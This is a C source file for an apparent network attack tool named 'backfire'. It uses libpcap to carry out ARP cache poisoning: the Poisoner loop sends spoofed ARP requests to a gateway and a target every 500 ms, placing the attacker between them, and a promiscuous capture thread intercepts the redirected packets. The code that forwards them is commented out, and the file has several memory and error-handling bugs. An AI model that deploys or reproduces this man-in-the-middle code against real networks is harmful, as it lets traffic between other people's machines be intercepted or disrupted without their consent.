#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <pcap/pcap.h>

#include "formats.h"
#include "analyzer.h"
#include "libs/uthash/uthash.h"

#define TRUE  1
#define FALSE 0
#define FAIL -2

#define BUFFSIZE 65535
#define BUFFER_TM 256 // Customs handler packet buffer timeout


// ----- ----- STRUCTS ----- ----- //
// Structure used to encapsulate threads' arguments
struct _ThreadArgs {
  pcap_t** captureHandler;
  char* targetDev;
  int snaplen;
  int promisc;
  int packetBufferTm;
  char *filterExp;
  bpf_u_int32 devMask; // device mask
  void* callback;
};
typedef struct _ThreadArgs ThreadArgs;


// ----- ----- GLOBALS ----- ----- //
extern int errno;
char gErrbuf[PCAP_ERRBUF_SIZE]; // pcap error buffer

// Pcap's handlers and device used to sniff
char* gTargetDev = NULL;
pcap_t* gPoisongHandler;
pcap_t* gGatekeeperHandler;

// Network basic informations
char* gGatewayIP = "192.168.1.1";
char* gTargetIP;
char* gGatewayMAC;
char* gSpoofedMAC = "3c:5a:b4:88:88:88";

// Termination condition
int gTerminate = FALSE;


// ----- ----- FUNCTION DEFINITIONS ----- ----- //
// Prints the usage
void  PrintUsage();
// Setup several global variables
void setup();
// Toggles 'gTerminate' value to TRUE on SIGINT interruption
void  SigIntHandler(int signum);
// Parses the 'policy.txt' file
char* PolicyParser(char* filename);
// Sends a spoofed arp request (IP: gateway IP / MAC: spoofed MAC) to each host discovered in the network
void  Spoof();
// Initializes and handle a pcaploop
void* pcapLoop(void *vargp);
// Capture analyzes and filter traffic
void  Gatekeeper(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes);
// Sends two requests to router and target device every x milliseconds
void Poisoner(pcap_t* poisonHandler, int xms);

// ----- ----- ARGUMENT PARSING ----- ----- //
int parseUArgs(int argc, char const *argv[]) {
  int opt;
  while ((opt = getopt(argc, (char *const *) argv, "i:a:d:h:t:")) != -1) {
      switch (opt) {
      case 'i': {
        gGatewayIP = optarg;
        break;
      }
      case 't': {
        gTargetIP = optarg;
        break;
      }
      case 'a': {
        gGatewayMAC = optarg;
        break;
      }
      case 'd': {
        gTargetDev = optarg;
        break;
      }
      case 'h': {
        PrintUsage();
        exit(0);
      }
      default:
        PrintUsage();
        return EXIT_FAILURE;
      }
  }

  if(gGatewayIP==NULL || gTargetIP==NULL || gTargetDev==NULL) {
    PrintUsage();
    return EXIT_FAILURE;
  }
  else return 0;
}


// ----- ----- MAIN ----- ----- //
int main(int argc, char const *argv[]) {
  // ----- Initialization ----- //
  // Parsing policy file
  if(parseUArgs(argc, argv) == -1) return -1;
  char* policies = PolicyParser("policy.txt");

  setup();

  // Checking root permissions
  if(geteuid() != 0) {
    fprintf(stderr, "Permission denied\n");
    return FAIL;
  }

  // Retrieving device info
  bpf_u_int32 devIP;   // device ip address
  bpf_u_int32 devMask; // device mask
  if(pcap_lookupnet(gTargetDev, &devIP, &devMask, gErrbuf) != 0) {
    fprintf(stderr, "Cannot retrieve informations for %s\n", gTargetDev);
    return FAIL;
  }

  signal(SIGINT, SigIntHandler); // CRTL-C termination

  // ----- Gatekeeping ----- //
  // Preparing Gatekeeper filter expression
  int policiesLength = (policies == NULL) ? 0 : strlen(policies);
  int filterLength = strlen(gSpoofedMAC) + policiesLength + 150;
  char* gatekeeperFilter = malloc(filterLength * sizeof(char));

  strcpy(gatekeeperFilter, "ether src not ");
  strcat(gatekeeperFilter, gSpoofedMAC);
  strcat(gatekeeperFilter, " && ether dst ");
  strcat(gatekeeperFilter, gSpoofedMAC);
  if(policies != NULL) {
    strcat(gatekeeperFilter, " && (");
    strcat(gatekeeperFilter, policies);
    strcat(gatekeeperFilter, ")");
    free(policies);
  }

  // Preparing Gatekeeper loop initializer arguments
  ThreadArgs* gatekeeperArgs = malloc(sizeof(ThreadArgs));
  gatekeeperArgs -> captureHandler = &gGatekeeperHandler;
  gatekeeperArgs -> targetDev = gTargetDev;
  gatekeeperArgs -> snaplen = BUFFSIZE;
  gatekeeperArgs -> promisc = TRUE;
  gatekeeperArgs -> packetBufferTm = BUFFER_TM;
  gatekeeperArgs -> filterExp = gatekeeperFilter;
  gatekeeperArgs -> devMask = devMask;
  gatekeeperArgs -> callback = Gatekeeper;

  // Starting the gatekeeper
  pthread_t gatekeeperTid;
  pthread_create(&gatekeeperTid, NULL, pcapLoop, (void*) gatekeeperArgs);

  // ----- Poisoning ----- //
  // Initializing handler
  pcap_t* poisonHandler = pcap_open_live(gTargetDev, BUFFSIZE, TRUE, BUFFER_TM, gErrbuf);
  if(poisonHandler != NULL) Poisoner(poisonHandler, 500);
  else fprintf(stderr, "%s", pcap_geterr(poisonHandler));

  // ----- Closing ----- //
  if(gGatekeeperHandler != NULL) pcap_breakloop(gGatekeeperHandler);
  pthread_join(gatekeeperTid, NULL);

  cleanAnalyzer(); // Cleaning analyzer

  printf("\nGlad to stop, sir.\n");
  return 0;
}


// ----- ----- ENVIRONMENT INITIALIZATION ----- ----- //
void setup() {
  // This variables have to be converted to network format
  ARP_REQUEST = htons(ARP_REQUEST);
  ARP_REPLY   = htons(ARP_REPLY);
  IP_PROTO    = htons(IP_PROTO);
}


// ----- ----- MISCELLANEOUS ----- ----- //
void PrintUsage() {
  printf("\
Usage: backfire [option]                                                          \n\
Options:                                                                          \n\
  -a [mac address]: gateway mac address                                           \n\
  -i [ip]         : gateway ip                                                    \n\
  -t [ip]         : target machine ip                                             \n\
  -d [device]     : device from which capture and inject the traffic              \n\
  ");
  printf("\n");
}

void SigIntHandler(int signum) {
  gTerminate = TRUE;
}

char* PolicyParser(char* filename) {
  FILE* fp;
  char* line = NULL;
  char* policy = NULL;
  size_t len = 0;
  ssize_t cread;

  fp = fopen(filename, "r");
  if (fp == NULL) return NULL;

  // Reading file line by line
  while ((cread = getline(&line, &len, fp)) != -1) {
    line[strlen(line)-1] = '\0';
    if(strcmp(line, "") == 0) continue;
    if(policy != NULL) {
      int totalSize = (strlen(policy) + cread + 7) * sizeof(char);
      policy = realloc(policy, totalSize);
      strcat(policy, " or (");
      strcat(policy, line);
      strcat(policy, ")");
    }
    else {
      // First line
      policy = malloc(cread * sizeof(char));
      strcpy(policy, line);
    }
  }

  // Cleaning and returning
  fclose(fp);
  if (line) free(line);
  return policy;
}


// ----- ----- LOOP INITIALIZER ----- ----- //
void cleanThreadEnv(ThreadArgs* args, pcap_t* handler, struct bpf_program* filter) {
  gTerminate = TRUE;

  if(handler != NULL) {
    pcap_close(handler);
    if(filter!=NULL) pcap_freecode(filter);
  }
  free(args);
}

void *pcapLoop(void *vargp) {
  ThreadArgs* args = (ThreadArgs*) vargp;
  pcap_t* handler;
  struct bpf_program filter;

  // Creating and opening handler
  if((handler = pcap_open_live(args->targetDev, args->snaplen, args->promisc, args->packetBufferTm, gErrbuf)) == NULL) {
    fprintf(stderr, "%s", pcap_geterr(handler));
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
  }

  // Setting up global handler
  pcap_t** ghandler = args->captureHandler;
  *ghandler = handler;

  // Setting up filters
  if (pcap_compile(handler, &filter, args->filterExp, TRUE, args->devMask) == -1) {
    fprintf(stderr, "%s", pcap_geterr(handler));
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
  }
	if (pcap_setfilter(handler, &filter) == -1) {
    fprintf(stderr, "%s", pcap_geterr(handler));
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
	}

  // Checking if something went wrong in the other thread
  if(gTerminate) {
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
  }

  // Setting up callback and loopig
  int loopReturn = pcap_loop(handler, -1, args->callback, (unsigned char *) handler);
  if(loopReturn == -1) {
    fprintf(stderr, "Error while looping");
  }

  // Cleaning and returning
  cleanThreadEnv(args, handler, &filter);
  pthread_exit(NULL);
}


// ----- ----- POISONER ----- ----- //
void Poisoner(pcap_t* poisonHandler, int xms) {
  // Starting poisoning
  while (!gTerminate) {
    // Poisoning gateway's cache
    uint8_t* spoofedPkt = BuildEthArp(ARP_REQUEST, gTargetIP, gSpoofedMAC, gGatewayIP, NULL);
    pcap_sendpacket(poisonHandler, spoofedPkt, ARP_SIZE); // ¯\_(ツ)_/¯
    free(spoofedPkt);

    // Poisoning target's cache
    spoofedPkt = BuildEthArp(ARP_REQUEST, gGatewayIP, gSpoofedMAC, gTargetIP, NULL);
    pcap_sendpacket(poisonHandler, spoofedPkt, ARP_SIZE);
    free(spoofedPkt);

    // Poisoning target cache
    usleep(xms * 1000);
  }
}

// ----- ----- GATEKEEPING ----- ----- //
void Gatekeeper(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes) {
  // Analyze(h->caplen, bytes);

  // Rebuilding Ethernet frame
  // EthHeader* eth = (EthHeader*) bytes;
  // memcpy(eth->srcAddr, ETH_BROADCAST, 6);
  // memcpy(eth->dstAddr, gGatewayMAC, 6);
  //
  // // Injecting
  // int res = pcap_sendpacket(gGatekeeperHandler, bytes, h->len);
  // if(res != 0) {
  //   fprintf(stderr, "Error while injecting: %s\n", pcap_geterr(gGatekeeperHandler));
  // }
}
